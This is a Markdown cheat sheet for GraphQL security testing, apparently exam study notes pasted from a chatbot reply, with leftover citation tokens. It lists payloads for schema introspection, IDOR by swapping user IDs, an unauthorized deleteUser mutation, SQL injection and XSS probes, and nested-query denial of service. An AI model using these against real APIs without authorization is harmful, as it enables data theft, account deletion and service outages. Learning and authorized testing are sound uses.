

---

``md
> [!ABSTRACT]
> GraphQL is an API query language that allows clients to request **exact data from a single endpoint** (usually `/graphql`).  
> 
> Vulnerabilities occur due to:
> - Weak authorization (accessing other users’ data)  
> - Introspection exposure (revealing schema)  
> - Over-fetching / excessive queries  
> - Injection attacks  
> 
> Unlike REST:
> - One endpoint → many operations  
> - Flexible queries → larger attack surface  
> 
> Impact:
> - Data leakage  
> - Authorization bypass (IDOR/BOLA)  
> - DoS via complex queries  
> 
> 🧠 Think: “You control the query → you control what data the server returns” :contentReference[oaicite:0]{index=0}

---

## 🧠 GraphQL – Cheat Sheet

---

### 🎯 1. Endpoint Discovery

> [!CHECK]
> Identify GraphQL endpoint  

```http
POST /graphql
````

```http
/api/graphql
```

```http
/graphql
```

---

### 🧪 2. Basic Query Test

> [!CHECK]  
> Confirm GraphQL endpoint

```json
{"query":"{__typename}"}
```

---

### 🧬 3. Introspection (Schema Enumeration)

> [!SUCCESS]  
> Dump schema (if enabled)

```json
{"query":"{__schema{types{name}}}"}
```

```json
{"query":"{__type(name:\"User\"){name,fields{name}}}"}
```

---

### 🧩 4. Query Data Extraction

> [!SUCCESS]  
> Retrieve sensitive data

```json
{"query":"{user{id,name,email,password}}"}
```

---

### 🧪 5. IDOR / Authorization Bypass

> [!SUCCESS]  
> Change object ID

```json
{"query":"{user(id:\"123\"){name,email}}"}
```

```json
{"query":"{user(id:\"124\"){name,email}}"}
```

---

### 💥 6. Mutation Abuse

> [!SUCCESS]  
> Perform unauthorized actions

```json
{"query":"mutation{deleteUser(id:\"123\")}"}
```

---

### ⚙️ 7. Injection Testing

> [!ATTENTION]  
> Test SQLi / XSS inside queries

```json
{"query":"{user(id:\"1 OR 1=1\"){name}}"}
```

```json
{"query":"{search(term:\"<script>alert(1)</script>\")}"}
```

---

### 🧪 8. Error-Based Enumeration

> [!CHECK]  
> Use errors to discover schema

```json
{"query":"{thisdoesnotexist}"}
```

---

### 💣 9. DoS via Nested Queries

> [!DANGER]  
> Overload server with deep queries

```json
{"query":"{user{friends{friends{friends{friends{id}}}}}}"}
```

---

### 🧪 10. Batching / Alias Abuse

> [!ATTENTION]  
> Send multiple queries in one request

```json
{"query":"{a:user(id:\"1\"){name} b:user(id:\"2\"){name}}"}
```

---

### 🔍 11. Real Workflow (Operator Method)

> [!SUCCESS]

1. Find endpoint:
    

```http
/graphql
```

2. Test query:
    

```json
{"query":"{__typename}"}
```

3. Dump schema:
    

```json
{"query":"{__schema{types{name}}}"}
```

4. Extract data:
    

```json
{"query":"{user{id,email,password}}"}
```

5. Test IDOR:
    

```json
{"query":"{user(id:\"124\"){email}}"}
```

---

### 🧠 12. Where to Test

> [!ABSTRACT]

- `/graphql` endpoints
    
- Mobile app APIs
    
- SPA backends
    
- Admin dashboards
    

---

## 🔥 Minimal Payload Set (EXAM USE)

> [!SUCCESS]  
> If you remember nothing else

```bash
{"query":"{__typename}"}
{"query":"{__schema{types{name}}}"}
{"query":"{user{id,email}}"}
{"query":"{user(id:\"124\"){email}}"}
{"query":"mutation{deleteUser(id:\"123\")}"}
```

---

## ⚠️ Operator Notes

> [!FAILURE]  
> If nothing happens:
> 
> - Introspection disabled
>     
> - Strong auth checks
>     
> - Query limits enforced
>     

---

> [!ATTENTION]  
> GraphQL vulnerabilities rely on:
> 
> - Flexible queries
>     
> - Weak access control
>     
> - Poor validation
>     
> 
> Always test:
> 
> - Introspection
>     
> - IDOR
>     
> - Mutations
>     
> - Query depth
>     

---

```

---

## 🔥 Key Insight (important for you)

- GraphQL = **API + logic + data exposure in one place**
- Most real bugs come from:
  - **IDOR (BOLA)**
  - **Over-fetching data**
- Always start with:
  👉 `__schema` → then pivot to data extraction  

---



Just say 🚀
::contentReference[oaicite:1]{index=1}
```